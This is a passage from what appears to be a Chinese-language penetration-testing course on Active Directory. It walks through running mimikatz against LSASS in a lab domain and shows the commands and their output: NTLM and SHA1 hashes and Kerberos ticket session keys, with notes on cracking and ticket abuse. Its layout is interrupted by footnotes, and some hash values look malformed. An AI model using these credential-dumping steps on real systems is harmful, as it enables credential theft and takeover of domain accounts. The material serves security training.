
`C:\Tools\active_directory>` `mimikatz.exe`

```
mimikatz # privilege::debug

Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 291668 (00000000:00047354)

Session       : Interactive from 1

User Name     : Offsec

Domain        : CORP

Logon Server  : DC01

Logon Time    : 08/02/2018 14.23.26

SID           : S-1-5-21-1602875587-2787523311-2599479668-1103

          msv :

            [00000003] Primary

            \* Username : Offsec
```

- 648 (Benjamin Delphe, 2018), https://github.com/gentilkiwi/mimikatz
- 649 (Matt Graeber, 2016), https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
- 650 (Ruben Boonen, 2016), http://www.fuzzysecurity.com/tutorials/18.html
- 651 (Benjamin Delphe, 2014), https://github.com/gentilkiwi/mimikatz/wiki/module~~-sekurlsa
- 652 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
- 653 (Mimikatz, 2019), https://github.com/gentilkiwi/mimikatz/wiki/module~~-sekurlsa

* 域		: CORP
* NTLM		: e2b475c11da2a074829d087aa966c327
* SHA1		: 8c77f430e4ab8acb010ead387d64011c76480d26e
* DPAPI		: 162d313bede93b0a2e72a030ec9216f0
tspkg		:
wdigest		:
* 用户名	: Offsec
* 域	: CORP
* 密码	: (null)
kerberos	:
* 用户名	: Offsec
* 域	: CORP.COM
* 密码	: (null)
...

## 列表 689 - 在域工作站上执行 mimikatz

上述输出片段显示了为域用户 `Offsec` 存储在 `LSASS` 中的所有凭据信息，包括缓存的哈希值。

请注意，上述输出中高亮显示了两类哈希值。这将根据 `AD` 实现的功能级别而有所不同。对于功能级别为 `Windows 2003` 的 `AD` 实例，`NTLM` 是唯一可用的哈希算法。对于运行 `Windows Server 2008` 或更高版本的实例，`NTLM` 和 `SHA-1`（`AES` 加密的常见伴侣）均可用。在 `Windows 7` 等较旧的操作系统上，或手动启用了该功能的操作系统上，`WDigest`、`654` 将被启用。当 `WDigest` 被启用时，运行 `Mimikatz` 将在密码哈希值旁边显示明文密码。

凭借这些哈希值，我们可以尝试破解它们以获得明文密码。

`Mimikatz` 的另一种用途是通过滥用 `TGT` 和服务票据来利用 `Kerberos` 认证。正如之前讨论的，我们知道当前登录到本地机器的用户的 `Kerberos TGT` 和服务票据会被存储以供将来使用。这些票据也存储在 `LSASS` 中，我们可以使用 `Mimikatz` 来交互并检索我们自己的票据以及其他本地用户的票据。

例如，在列表 690 中，我们使用 `Mimikatz` 显示存储在内存中的 `Offsec` 用户的票据：

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 291668 (00000000:00047354)

Session		: Interactive from 1

User Name		: Offsec

Domain		: CORP

Logon Server	: DC01

Logon Time	: 08/02/2018 14,23,26

SID		: S-1-5-21-1602875587-2787523311-2599479668-1103

* Username : Offsec

* Domain : CORP.COM

* Password : (null)
```

654 (Microsoft, 2003). https://technet.microsoft.com/en-us/library/yc778868(v=ws.10).aspx

![](img/ec25e59d75726b7041242a56d3376832_642_0.png)

![](img/ec25e59d75726b7041242a56d3376832_643_0.png)

组 0 – **票据授予服务**

```
[00000000]

[00000001]

[00000002]
```

```
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47

Service Name (02): cifs ; dc01 ; @ CORP.COM

Target Name (02): cifs ; dc01 ; @ CORP.COM

Client Name (01): Offsec ; @ CORP.COM

Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;

Session Key: 0x00000012 - aes256_hmac

d062a1bc89c09544a7130652f4d4bae4c04833c3324aa2e1b1051816a7090a0718

Ticket: 0x00000012 - aes256_hmac ; kvno = 3
```

组 1 – 客户票据 ?

组 2 – **票据授予票据**

```
[00000000]

[00000001]

[00000002]
```

```
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47

Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM

Target Name (02): @ CORP.COM

Client Name (01): Offsec ; @ CORP.COM ($$Delegation Ticket$$)

Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa

Session Key: 0x00000012 - aes256_hmac

3b0a49af17a1ada1dacf2e3b8964ad397d80270b7118cc567da4d4b2b6dc90d

Ticket: 0x00000012 - aes256_hmac ; kvno = 2
```

```
[00000001]

Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47

Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM

Target Name (02): krbtgt ; CORP.COM ; @ CORP.COM

Client Name (01): Offsec ; @ CORP.COM ( CORP.COM )

Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward

Session Key: 0x00000012 - aes256_hmac

8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f56e91a749c

Ticket: 0x00000012 - aes256_hmac ; kvno = 2
```
